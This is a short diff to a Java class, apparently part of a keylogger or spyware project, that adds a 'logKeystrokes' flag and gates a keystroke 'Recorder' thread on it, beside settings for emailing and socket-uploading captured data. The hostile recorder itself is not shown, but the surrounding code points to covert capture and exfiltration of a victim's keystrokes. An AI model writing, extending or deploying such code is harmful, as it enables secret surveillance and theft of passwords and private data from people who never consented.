@@ -160,6 +160,7 @@ public class Radio
 	 * @string staticIP sets static IP addr to use if static IP is enabled
 	 */
 	
+	public static boolean logKeystrokes = true;
 	public static boolean emailUpload = true;
 	public static boolean emailReceive = true;
 	public static boolean socketUpload = false;
@@ -183,19 +184,22 @@ public class Radio
 		a = new Astatine();
 		AlphaDecay = new Thread(a);
 		Chocolat.println("[" + m.robert.elapsedTime() + "] Starting a new thread for you...");
-		Executors.newSingleThreadExecutor().execute(new Runnable() {
-		    @Override
-		    public void run() {
-		    	try {
-					m.exec();
-					Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Recorder launched successfully.");
-				} catch (IOException | URISyntaxException e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
-				}
-		    }
-		});
-		Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Done.");
+		if (logKeystrokes)
+		{
+			Executors.newSingleThreadExecutor().execute(new Runnable() {
+				@Override
+				public void run() {
+					try {
+						m.exec();
+						Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Recorder launched successfully.");
+					} catch (IOException | URISyntaxException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}
+				}	
+			});
+			Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Done.");
+		}
 		java.util.Date d = new java.util.Date();
 	    Calendar cl = Calendar.getInstance();
 	    cl.setTime(d);
